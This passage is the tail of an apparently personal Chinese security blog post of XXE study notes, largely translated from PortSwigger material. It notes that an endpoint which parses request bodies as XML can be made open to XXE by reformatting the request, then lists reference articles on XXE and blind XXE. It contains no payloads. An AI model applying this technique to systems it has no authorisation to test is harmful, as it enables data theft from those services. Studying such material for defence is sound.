<p>&#x5982;&#x679C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5141;&#x8BB8;&#x6D88;&#x606F;&#x6B63;&#x6587;&#x4E2D;&#x5305;&#x542B; XML &#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x5C06;&#x6B63;&#x6587;&#x5185;&#x5BB9;&#x89E3;&#x6790;&#x4E3A; XML&#xFF0C;&#x5219;&#x53EA;&#x9700;&#x91CD;&#x65B0;&#x683C;&#x5F0F;&#x5316;&#x8BF7;&#x6C42;&#x4EE5;&#x4F7F;&#x7528; XML &#x683C;&#x5F0F;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C; XXE &#x653B;&#x51FB;&#x4E86;</p>
<h1 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h1><p>&#x672C;&#x6587;&#x4EC5;&#x4F5C;&#x8BB0;&#x5F55;&#xFF0C;&#x591A;&#x673A;&#x7FFB;&#x81EA; <a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">portswigger web-security</a></p>
<p>&#x8BB0;&#x5F55;&#x4E86;&#x57FA;&#x7840; XXE &#x7684;&#x5229;&#x7528;&#x9762;</p>
<p>&#x5E0C;&#x671B;&#x80FD;&#x78B0;&#x5230; XXE &#x5B9E;&#x4F8B;&#xFF0C;&#x5B9E;&#x7AD9;&#x5206;&#x6790;&#x4E00;&#x6CE2;</p>
<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">XXE injection</a></p>
<p><a href="https://portswigger.net/web-security/xxe/blind" target="_blank" rel="noopener">Blind XXE</a></p>
<p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">Blind XXE &#x8BE6;&#x89E3;&#x4E0E; Google CTF &#x4E00;&#x9053;&#x9898;&#x5206;&#x6790;</a></p>
<p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">Exploiting XXE with local DTD files</a></p>
<p><a href="https://xz.aliyun.com/t/2571" target="_blank" rel="noopener">XML &#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x6CE8;&#x5165;&#x5C0F;&#x7ED3;</a></p>
<p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">&#x4E00;&#x7BC7;&#x6587;&#x7AE0;&#x5E26;&#x4F60;&#x6DF1;&#x5165;&#x7406;&#x89E3;&#x6F0F;&#x6D1E;&#x4E4B; XXE &#x6F0F;&#x6D1E;</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>c0r1</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://www.c0r1.com/2019/11/12/XXE-学习笔记/">http://www.c0r1.com/2019/11/12/XXE-学习笔记/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2019/11/18/PHP-Audit-Labs-Day4-strpos-使用不当引发漏洞/">PHP-Audit-Labs-Day4 strpos 使用不当引发漏洞</a>
            
            
            <a class="next" rel="next" href="/2019/11/04/PHP-Audit-Labs-Day2-filter-var-函数缺陷/">PHP-Audit-Labs-Day2 filter_var() 函数缺陷</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© c0r1 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
